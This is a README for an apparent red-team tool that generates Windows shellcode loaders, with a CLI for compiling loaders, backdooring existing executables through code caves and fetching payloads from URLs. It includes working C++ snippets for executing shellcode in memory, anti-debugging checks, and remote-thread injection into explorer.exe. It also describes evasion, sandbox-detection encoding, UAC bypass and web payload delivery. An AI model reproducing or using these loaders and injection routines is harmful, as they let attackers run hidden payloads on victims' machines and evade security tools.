# Washmachine

> A CLI-first shellcode loader builder with a WinUI 3 desktop app — driven entirely by a single YAML catalog.

Washmachine wraps the full shellcode-loader workflow into one tool: pick a shellcode source, choose a C++ template, stack pluggable feature snippets (anti-debugging, evasion, guardrails, process injection, shellcode execution, UAC bypass), and compile with whatever toolchain is on the machine. Available as both a **standalone CLI** (`washmachine-cli`) and a **WinUI 3 desktop app**.

📖 **[View Full Documentation](https://0xhmza.github.io/washmachine/)** — Complete documentation website with getting started guide, CLI reference, and architecture details.

---

## Table of Contents

- [Documentation](#documentation)
- [Features](#features)
- [Requirements](#requirements)
- [CLI Reference](#cli-reference)
- [Building](#building)
- [Usage Guide](#usage-guide)
  - [Shellcode Sources](#shellcode-sources)
  - [Web Payload Wizard](#web-payload-wizard)
  - [Templates](#templates)
  - [Snippet Sections](#snippet-sections)
  - [Encoding Options](#encoding-options)
  - [Compilation](#compilation)
- [YAML Catalog Reference](#yaml-catalog-reference)
  - [File Structure](#file-structure)
  - [Templates](#templates-1)
    - [Placeholders](#placeholders)
    - [Preamble](#preamble)
  - [Sections](#sections)
    - [Items](#items)
    - [Inputs](#inputs)
  - [System Placeholders](#system-placeholders)
  - [Snippet Template Keys](#snippet-template-keys)
  - [Special Substitutions](#special-substitutions)
  - [Complete Annotated Example](#complete-annotated-example)
- [Project Layout](#project-layout)
- [Architecture](#architecture)
- [Testing](#testing)
- [License](#license)

---

## Documentation

📚 **Full documentation is available at [https://0xhmza.github.io/washmachine/](https://0xhmza.github.io/washmachine/)**

The documentation website includes:
- **[Getting Started](https://0xhmza.github.io/washmachine/getting-started.html)** — Installation, building, and initial setup
- **[CLI Reference](https://0xhmza.github.io/washmachine/cli-reference.html)** — Complete command documentation with examples
- **[Architecture](https://0xhmza.github.io/washmachine/architecture.html)** — Project structure, design patterns, and key flows

The documentation source files are located in the `docs/` directory and are automatically published to GitHub Pages.

---

## Features

| Feature | Details |
|---|---|
| **Multiple shellcode sources** | File (`.bin`), raw hex paste, URL (web delivery), or built-in test payload |
| **Web payload wizard** | Step-by-step UI to configure encoding, envelope, and web-fetch helper via Bin2Shell, then verify the hosted URL |
| **YAML template engine** | One file defines every C++ template and every available snippet — no recompile needed to add new techniques |
| **Pluggable snippet sections** | Anti-debugging, evasion, guardrails, process injection, shellcode execution, UAC bypass — each independently selectable |
| **Auto-discovered compiler** | Detects MSVC (`cl.exe`), GCC (`g++.exe`), or Clang (`clang++.exe`) from PATH, common VS install paths, and `VCToolsInstallDir` |
| **Payload encoding** | Bin2Shell integration for encoder, envelope, anti-emulation, and web-helper selection |
| **Auto-provisioning** | Downloads Bin2Shell automatically on first run if not present |
| **Session logging** | Each compilation saves `source.cpp` and `build_log.txt` under `logging/session_*/` |

---

## Requirements

### CLI (`washmachine-cli`)

| Component | Version |
|---|---|
| OS | Windows 10 1809 (build 17763)+ / Windows 11 |
| .NET | 8.0 Runtime x64 |
| C++ Compiler | Any of: MSVC (VS Build Tools), MinGW-w64 `g++`, or `clang++` on PATH |
| Python | 3.10+ on PATH — required for Bin2Shell encoding features |

### Desktop App (`washmachine`)

| Component | Version |
|---|---|
| OS | Windows 10 1809 (build 17763)+ / Windows 11 |
| .NET | 8.0 **Desktop** Runtime x64 |
| Windows App SDK | 1.8 Runtime |
| C++ Compiler | Any of: MSVC (VS Build Tools), MinGW-w64 `g++`, or `clang++` on PATH |
| Python | 3.10+ on PATH — required for Bin2Shell encoding features |

---

## CLI Reference

```
washmachine-cli <command> [options]
```

| Command | Description |
|---|---|
| `compile` | Build a shellcode loader executable |
| `analyze` | Analyze a PE file (headers, sections, imports, code caves) |
| `backdoor` | Inject shellcode into an existing PE via code-cave |
| `list` | List available templates, encoders, snippets, or compilers |
| `provision` | Download and install required external tools (Bin2Shell) |
| `test` | Run the automated test harness |

### Examples

```powershell
# Compile from a .bin shellcode file using the minimal template
washmachine-cli compile -s payload.bin -t shellcode-minimal

# Compile with XOR encoding, output as JSON
washmachine-cli compile -s payload.bin -e 1 --json

# Analyze a PE file
washmachine-cli analyze target.exe --json

# Inject shellcode into an existing PE
washmachine-cli backdoor --pe target.exe -s payload.bin -o patched.exe

# List discovered compilers and available templates
washmachine-cli list --compilers
washmachine-cli list --templates

# Download Bin2Shell (run once before using encoding features)
washmachine-cli provision

# Run the automated test harness
washmachine-cli test --shellcode messagebox.bin --phase all
```

---

## Building

```powershell
# Build all three projects
dotnet build washmachine.sln
```

| Project | Debug output |
|---|---|
| Washmachine.Cli | `Output\Debug\net8.0\washmachine-cli.exe` |
| washmachine (GUI) | `Output\Debug\net8.0-windows10.0.19041.0\washmachine.exe` |

### Publish for release

```powershell
# CLI — single-file executable → Output\Release\cli\publish\
dotnet publish Washmachine.Cli\Washmachine.Cli.csproj -c Release

# GUI — framework-dependent → Output\Release\publish\
dotnet publish washmachine.csproj -c Release
```

See [ARCHITECTURE.md](ARCHITECTURE.md) for full delivery instructions, runtime prerequisites, and what to include in each release package.

---

## Usage Guide

### Shellcode Sources

Choose one source mode from the **Source** section:

| Mode | How to use |
|---|---|
| **File** | Browse to a `.bin` shellcode file |
| **Raw** | Paste raw hex bytes (e.g. `\xfc\x48\x83...`) directly into the text box |
| **URL** | Enter the remote URL where the payload is hosted — triggers web delivery mode |
| **Test payload** | Selects the built-in `calc.exe` shellcode for smoke-testing the pipeline |

### Web Payload Wizard

When **URL** mode is selected, click **Web Payload Wizard** to:

1. Choose an **encoder** and **envelope** from Bin2Shell's catalog
2. Optionally pick a **web-fetch helper** (download method)
3. Enter the hosting URL — the tool calls Bin2Shell in `-w` mode and verifies the endpoint responds
4. On success, the generated C++ fetch + decode code is stitched into the template automatically

### Templates

The **Template** combo lists every `id` defined under `templates:` in `Assets/vx_api_snippets.yaml`. Two ship by default:

| Template ID | Description |
|---|---|
| `default` | Full loader with all feature placeholders (`GUARDRAILS`, `ANTI_DEBUGGING`, `UAC_BYPASS`, `PROCESS_INJECTION`, `SHELLCODE_EXECUTION`) |
| `shellcode-minimal` | Bare minimum — shellcode source + one execution snippet, nothing else |

Selecting a template resets the available snippet combos to only those referenced by that template's `placeholders`.

### Snippet Sections

Each template placeholder of `kind: snippet` maps to one **section** in the catalog. The UI renders a dropdown per section populated with that section's items.

Sections that declare `allowMultiple: true` (e.g. Anti Debugging) let you stack several snippets; others allow only one choice.

Sections that declare `inputs` render extra text boxes in the UI for parameters (e.g. target process name for process injection, guardrail condition string).

### Encoding Options

The **Encoding** panel (enabled only when Bin2Shell is present) exposes:

- **Encoder** — transforms the raw shellcode bytes (XOR, RC4, AES, etc.)
- **Envelope** — wraps the encoded payload (Base64, Base32, Base91, etc.)
- **Anti-emulation** — adds sandbox-detection arguments to the Bin2Shell invocation

These options are read live from Bin2Shell's help output, so new algorithms added to `algos.yaml` appear automatically.

### Compilation

After clicking **Go**, the pipeline runs in order:

1. Shellcode is encoded via Bin2Shell (if encoding is configured)
2. Snippets are collected; their `includes` and `implementation` blocks are deduplicated and merged
3. The selected template's `content` is rendered — all `{{PLACEHOLDER}}` tokens are substituted
4. The final `.cpp` source is written to `temp/cpp/`
5. The compiler is invoked; output exe lands in `temp/cpp/Compiled BInaries/`
6. Session artifacts (`source.cpp`, `build_log.txt`) are saved under `logging/session_<timestamp>_<uuid>/`

---

## YAML Catalog Reference

All templates and snippets live in a **single file**: `Assets/vx_api_snippets.yaml`. This is the only file you need to edit to add new techniques, templates, or UI controls.

The catalog is parsed by `YamlCodeSnippetCatalogService` using [YamlDotNet](https://github.com/aaubry/YamlDotNet) with camelCase naming. It can also be written as JSON if preferred — the service tries YAML first, then JSON.

### File Structure

```yaml
# One top-level templates list and one top-level sections list.
# Order inside each list does not matter to the engine.

templates:
  - id: ...
    ...

sections:
  - header: ...
    ...
```

---

### Templates

```yaml
templates:
  - id: "my-template"           # unique, kebab-case recommended
    display: "My Template"      # shown in the UI dropdown
    description: "What it does" # tooltip / info text
    preamble: |                 # optional — C++ placed before main()
      // shared helpers, typedefs, etc.
    content: |                  # required — the C++ template body
      #include <windows.h>

      {{SNIPPET_INCLUDES}}
      {{PREAMBLE}}
      {{SNIPPET_IMPLEMENTATIONS}}

      INT main(VOID)
      {
          {{SHELLCODE_SOURCE}}
          {{SHELLCODE_EXECUTION}}
          return 0;
      }
    placeholders:               # required — declares every {{TOKEN}} the engine knows about
      - name: "SHELLCODE_SOURCE"
        kind: system
      - name: "SHELLCODE_EXECUTION"
        kind: snippet
        snippetTemplate: "SHELLCODEEXECUTION"
```

#### Placeholders

Each placeholder entry has two mandatory fields:

| Field | Values | Description |
|---|---|---|
| `name` | Any string | Must match the `{{TOKEN}}` used in `content` exactly (case-insensitive) |
| `kind` | `system` \| `snippet` | `system` = filled automatically by the engine; `snippet` = filled from user's combo-box selection |
| `snippetTemplate` | Section key string | Required when `kind: snippet`. Identifies which section supplies the code. See [Snippet Template Keys](#snippet-template-keys). |

#### Preamble

`preamble` is optional C++ source placed at file scope **before** `main()`. Inject it in `content` using the `{{PREAMBLE}}` system placeholder. Use it for:

- Shared type definitions
- Helper function implementations that snippets call into
- `#pragma comment(lib, ...)` directives

```yaml
preamble: |
  static BOOL IsElevated()
  {
      BOOL elevated = FALSE;
      HANDLE token;
      if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token))
      {
          TOKEN_ELEVATION te{};
          DWORD size = sizeof(te);
          if (GetTokenInformation(token, TokenElevation, &te, size, &size))
              elevated = te.TokenIsElevated;
          CloseHandle(token);
      }
      return elevated;
  }
```

---

### Sections

A **section** is a named group of selectable code snippets that maps to one snippet placeholder in a template.

```yaml
sections:
  - header: "My Technique"      # human-readable name, shown in UI
    template: "mytechnique"     # key used for matching — see Snippet Template Keys
    display: "My Technique"     # optional override for UI label
    allowMultiple: false        # true = user can stack multiple items from this section
    inputs:                     # optional list of UI input controls
      - ...
    items:                      # required — the selectable snippets
      - ...
```

#### Items

Each item is one selectable technique entry:

```yaml
items:
  - id: "MySnippetId"           # unique within the section
    display: "Friendly Name"    # shown in the combo box
    default: true               # pre-selected when the section first loads
    includes: |                 # optional — extra #include lines for this snippet only
      #include <some_header.h>
    implementation: |           # optional — C++ function(s) placed before main()
      static BOOL MyHelper()
      {
          return TRUE;
      }
    snippet: |                  # required — code injected at the placeholder site
      if (!MyHelper()) return 0;
```

**How items are assembled:**

1. `includes` lines from all selected snippets are deduplicated and injected at `{{SNIPPET_INCLUDES}}`
2. `implementation` blocks from all selected snippets are concatenated and injected at `{{SNIPPET_IMPLEMENTATIONS}}`
3. `snippet` is the call-site code injected directly at the named placeholder (e.g. `{{ANTI_DEBUGGING}}`)

This separation means heavy function bodies stay in `implementation`, keeping the placeholder call-site readable.

#### Inputs

Sections can declare one or more UI input controls that render alongside the snippet selector. The input value is substituted into the `snippet` text using its `id` as the token name.

```yaml
inputs:
  - id: "myParamTextBox"        # also the substitution key in snippet text
    type: "textbox"             # currently only "textbox" is supported
    label: "Parameter label"    # shown next to the input
    placement: "before"         # "before" = above selector, "after" = below
    width: 240                  # control width in pixels
    required: true              # validation — warns if left empty
    defaultValue: "notepad.exe" # pre-filled value
    infoAction: "MyInfo"        # optional — wires an info button to a named action
    infoButtonLabel: "?"        # label for the info button
```

The input `id` is injected into the snippet text as a literal parameter. For example, a snippet referencing `$processname$` combined with an input whose `id` is `processNameTextBox` (and value `notepad.exe`) becomes `notepad.exe` at the call site.

---

### System Placeholders

These are filled automatically by the engine and should be declared as `kind: system` in your template's `placeholders` list:

| Placeholder | What gets injected |
|---|---|
| `{{SHELLCODE_SOURCE}}` | The encoded shellcode array declaration (or web payload body in URL mode) |
| `{{SHELLCODE_URL}}` | URL-mode fetch code (empty in file/raw/test modes) |
| `{{PREAMBLE}}` | The template's own `preamble` string |
| `{{SNIPPET_INCLUDES}}` | Deduplicated `#include` lines from all selected snippets |
| `{{SNIPPET_IMPLEMENTATIONS}}` | All `implementation` blocks concatenated, placed before `main()` |
| `{{PROCESS_LOOKUP_HELPER}}` | `GetProcessOrThreadId()` helper function (injected when process injection is active) |

---

### Snippet Template Keys

The `snippetTemplate` field in a placeholder must **loosely match** the `template` field of a section. The engine uses a fuzzy normalizer (strips non-alphanumeric, lowercases, trims plural suffixes) so minor variations work. The built-in constants the engine switches on are:

| Constant | Normalized form | Section `template` should contain |
|---|---|---|
| `ANTIDEBUGGING` | `antidebugging` | `antidebugging` |
| `PSINJECTION` | `psinjection` | `psinjection` |
| `SHELLCODEEXECUTION` | `shellcodeexecution` | `shellcodeexecution` |
| `UACB` | `uacb` | `uacb` |
| `GUARDRAIL` | `guardrail` | `guardrail` |
| `GENERICSHELLCODE` | `genericshellcode` | `genericshellcode` |

For any key not in this list, the engine falls through to `ApplyGenericSnippetSelection` — meaning you can add entirely **custom section types** just by giving them a unique `snippetTemplate` key, declaring that key in a template placeholder, and adding the section with a matching `template` value. No C# changes needed.

---

### Special Substitutions

Inside a snippet's `snippet` field, the engine performs these text replacements at render time:

| Token | Replaced with |
|---|---|
| `$psname$` | Value of the `PsInjPsNameTextBox` input (process injection target) |
| `__GUARDRAIL_PARAM__` | Value of the `guardrailParamTextBox` input (guardrail condition) |

---

### Complete Annotated Example

The following shows a fully self-contained catalog with two templates and one custom section, demonstrating every available field:

```yaml
# ─────────────────────────────────────────────────────
#  Templates
# ─────────────────────────────────────────────────────
templates:

  # Minimal template — shellcode source + one execution snippet
  - id: "shellcode-minimal"
    display: "Shellcode Minimal"
    description: "Bare VirtualAlloc loader, no extra features."
    content: |
      #define WIN32_LEAN_AND_MEAN
      #include <windows.h>

      {{SNIPPET_INCLUDES}}
      {{SNIPPET_IMPLEMENTATIONS}}

      INT main(VOID)
      {
          {{SHELLCODE_SOURCE}}
          {{SHELLCODE_EXECUTION}}
          return 0;
      }
    placeholders:
      - name: "SNIPPET_INCLUDES"
        kind: system
      - name: "SNIPPET_IMPLEMENTATIONS"
        kind: system
      - name: "SHELLCODE_SOURCE"
        kind: system
      - name: "SHELLCODE_EXECUTION"
        kind: snippet
        snippetTemplate: "SHELLCODEEXECUTION"

  # Full loader — every feature category wired up
  - id: "full-loader"
    display: "Full Loader"
    description: "Anti-debug, guardrails, sleep obfuscation, then execute."
    preamble: |
      // Placed before main() — shared helper referenced by snippets
      static void RandomSleep(DWORD minMs, DWORD maxMs)
      {
          DWORD range = maxMs - minMs;
          DWORD delay = minMs + (range > 0 ? (rand() % range) : 0);
          Sleep(delay);
      }
    content: |
      #define WIN32_LEAN_AND_MEAN
      #include <windows.h>
      #include <tlhelp32.h>

      {{SNIPPET_INCLUDES}}
      {{PREAMBLE}}
      {{SNIPPET_IMPLEMENTATIONS}}
      {{PROCESS_LOOKUP_HELPER}}

      INT main(VOID)
      {
          {{SHELLCODE_SOURCE}}

          {{GUARDRAILS}}

          {{ANTI_DEBUGGING}}

          {{SLEEP_OBFUSCATION}}

          {{PROCESS_INJECTION}}

          {{SHELLCODE_EXECUTION}}

          return 0;
      }
    placeholders:
      - name: "SNIPPET_INCLUDES"
        kind: system
      - name: "PREAMBLE"
        kind: system
      - name: "SNIPPET_IMPLEMENTATIONS"
        kind: system
      - name: "PROCESS_LOOKUP_HELPER"
        kind: system
      - name: "SHELLCODE_SOURCE"
        kind: system
      - name: "GUARDRAILS"
        kind: snippet
        snippetTemplate: "GUARDRAIL"
      - name: "ANTI_DEBUGGING"
        kind: snippet
        snippetTemplate: "ANTIDEBUGGING"
      - name: "SLEEP_OBFUSCATION"
        kind: snippet
        snippetTemplate: "sleepobfuscation"    # custom section — no C# change needed
      - name: "PROCESS_INJECTION"
        kind: snippet
        snippetTemplate: "PSINJECTION"
      - name: "SHELLCODE_EXECUTION"
        kind: snippet
        snippetTemplate: "SHELLCODEEXECUTION"

# ─────────────────────────────────────────────────────
#  Sections
# ─────────────────────────────────────────────────────
sections:

  # ── Anti Debugging ────────────────────────────────
  - header: "Anti Debugging"
    template: "antidebugging"
    display: "Anti Debugging"
    allowMultiple: true           # user can stack multiple checks
    items:
      - id: "CloseHandleAntiDebug"
        display: "CloseHandle on invalid address"
        default: true
        snippet: |
          __try { CloseHandle((HANDLE)0xDEADBEEF); return FALSE; }
          __except (EXCEPTION_INVALID_HANDLE == GetExceptionCode()
              ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH)
          { /* debugger present */ return TRUE; }

      - id: "IsDebuggerPresentCheck"
        display: "IsDebuggerPresent"
        snippet: |
          if (IsDebuggerPresent()) return 0;

  # ── Shellcode Execution ───────────────────────────
  - header: "Shellcode Execution"
    template: "shellcodeexecution"
    display: "Shellcode Execution"
    allowMultiple: false
    items:
      - id: "VirtualAllocFuncPtr"
        display: "VirtualAlloc + function pointer"
        default: true
        snippet: |
          void* mem = VirtualAlloc(NULL, code_blob_len,
                                   MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
          if (!mem) return -1;
          memcpy(mem, code_blob, code_blob_len);
          DWORD old;
          VirtualProtect(mem, code_blob_len, PAGE_EXECUTE_READWRITE, &old);
          ((void(*)())mem)();
          VirtualFree(mem, 0, MEM_RELEASE);

      - id: "CreateThreadExec"
        display: "CreateThread"
        includes: |
          // no extra includes needed
        snippet: |
          void* mem = VirtualAlloc(NULL, code_blob_len,
                                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
          if (!mem) return -1;
          memcpy(mem, code_blob, code_blob_len);
          HANDLE t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
          if (t) WaitForSingleObject(t, INFINITE);

  # ── Guardrails ────────────────────────────────────
  - header: "Guardrails"
    template: "guardrail"
    display: "Environment Guardrail"
    allowMultiple: false
    inputs:
      - id: "guardrailParamTextBox"
        type: "textbox"
        label: "Guardrail condition"
        placement: "before"
        width: 300
        required: true
        defaultValue: "USERDOMAIN#equals#CORP"
        infoAction: "GuardRailInfo"
        infoButtonLabel: "?"
    items:
      - id: "EnvVarGuardrail"
        display: "Require environment variable"
        default: true
        snippet: |
          if (GetEnvironmentVariableW(L"__GUARDRAIL_PARAM__", nullptr, 0) == 0)
              return 0;

  # ── Process Injection ─────────────────────────────
  - header: "Process Injection"
    template: "psinjection"
    display: "Process Injection"
    allowMultiple: false
    inputs:
      - id: "PsInjPsNameTextBox"
        type: "textbox"
        label: "Target process"
        placement: "before"
        width: 240
        required: true
        defaultValue: "explorer.exe"
    items:
      - id: "WriteProcessMemoryCRT"
        display: "WriteProcessMemory + CreateRemoteThread"
        default: true
        implementation: |
          static BOOL InjectWPMCRT(PBYTE payload, DWORD size, DWORD pid)
          {
              HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
              if (!hProc) return FALSE;
              LPVOID base = VirtualAllocEx(hProc, NULL, size,
                                           MEM_COMMIT, PAGE_EXECUTE_READWRITE);
              if (!base) { CloseHandle(hProc); return FALSE; }
              WriteProcessMemory(hProc, base, payload, size, NULL);
              HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
                                                  (LPTHREAD_START_ROUTINE)base,
                                                  NULL, 0, NULL);
              if (hThread) WaitForSingleObject(hThread, INFINITE);
              CloseHandle(hProc);
              return hThread != NULL;
          }
        snippet: |
          if (InjectWPMCRT((PBYTE)code_blob, dwSize,
                           GetProcessOrThreadId(L"$psname$", true))) return 1;

  # ── Sleep Obfuscation (custom section) ────────────
  # Linked to the full-loader template via snippetTemplate: "sleepobfuscation"
  - header: "Sleep Obfuscation"
    template: "sleepobfuscation"
    display: "Sleep Obfuscation"
    allowMultiple: false
    items:
      - id: "RandomSleepObfuscation"
        display: "Random sleep (uses preamble helper)"
        default: true
        snippet: |
          RandomSleep(500, 2000);
```

---

## Project Layout

```
washmachine/
├── Washmachine.Core/                   ← headless class library (net8.0)
│   ├── Logging/                        ← IAppLogger, ConsoleLogger
│   ├── Models/                         ← UIData, PE models, snippet/template models
│   ├── Services/                       ← all business logic (compiler, analyzer, provisioner…)
│   ├── Testing/
│   │   └── TestHarness.cs              ← headless combinatorial test runner
│   └── Washmachine.Core.csproj
│
├── Washmachine.Cli/                    ← console app (net8.0)
│   ├── Program.cs                      ← compile / analyze / backdoor / list / provision / test
│   └── Washmachine.Cli.csproj
│
├── Assets/
│   └── vx_api_snippets.yaml            ← single source of truth for all templates & snippets
├── Controllers/
│   └── MainFormCoordinator.cs          ← wires GUI events to Core services
├── Logging/
│   └── RichTextBoxLogger.cs            ← WinUI-specific logger
├── Services/                           ← GUI-only services (clipboard, file pickers, visual tree)
├── Views/                              ← WinUI 3 pages and windows
├── Testing/
│   └── run_tests.ps1                   ← PowerShell driver for TestHarness
├── App.xaml[.cs]
├── MainWindow.xaml[.cs]
├── Program.cs                          ← GUI entry point
├── washmachine.csproj                  ← GUI project (references Core)
├── washmachine.sln
└── ARCHITECTURE.md                     ← architecture & delivery guide
```

---

## Architecture

The project follows a **CLI-first, shared-core** architecture:

```
washmachine (GUI) ──references──► Washmachine.Core
Washmachine.Cli  ──references──► Washmachine.Core
```

All business logic (compilation, PE analysis, Bin2Shell integration, YAML catalog, test harness) lives in `Washmachine.Core`. Neither the CLI nor the GUI contains domain logic — they are thin consumers of Core services.

See [ARCHITECTURE.md](ARCHITECTURE.md) for the full architecture diagram, compilation pipeline walkthrough, and end-product delivery guide.

---

## Testing

A headless combinatorial test harness exercises Phase 1 (all encoder × envelope combinations) and Phase 2 (all template × snippet permutations) without any UI.

```powershell
# Build CLI and run all phases
.\Testing\run_tests.ps1 -ShellcodeFile path\to\messagebox.bin

# Run only Phase 1 (encoding combos)
.\Testing\run_tests.ps1 -Phase 1 -ShellcodeFile path\to\messagebox.bin

# Run only Phase 3 (multiple shellcode inputs from test assets)
.\Testing\run_tests.ps1 -Phase 3
```

Or invoke directly via the CLI:

```powershell
washmachine-cli test --shellcode path\to\messagebox.bin --phase all
washmachine-cli test --shellcode path\to\messagebox.bin --phase 1 --url http://host/payload.bin
washmachine-cli test --phase 3 --test-assets "testing assets\binary\shellcodes"
```

Results are written to `test_results.json` next to the CLI executable.

---

## License

See repository for license details.
